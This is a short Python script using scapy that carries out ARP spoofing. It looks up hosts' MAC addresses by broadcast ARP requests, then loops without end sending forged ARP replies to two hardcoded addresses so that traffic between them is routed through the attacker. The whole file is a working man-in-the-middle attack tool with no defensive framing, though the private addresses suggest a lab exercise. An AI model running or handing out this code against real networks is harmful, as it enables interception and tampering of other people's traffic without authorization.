#!/usr/bin/python3


import scapy.all as scapy
import time
#import sys

#macking change on router machine
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose=False)
    pass


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    (answered, unanswered) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False) # srp allow to send custom ether part
    #print(answered[0])
    return answered[0][1].hwsrc
    


#get_mac("172.17.0.3")
sent_packets_count = 0
while True:
    spoof("172.17.0.3", "192.168.18.1")
    sent_packets_count +=1
    spoof("192.168.18.1", "172.17.0.3")
    sent_packets_count +=1
    print("\r[+] sent two packets: " + str(sent_packets_count), end="")
    #sys.stdout.flush()
    time.sleep(2)
    pass
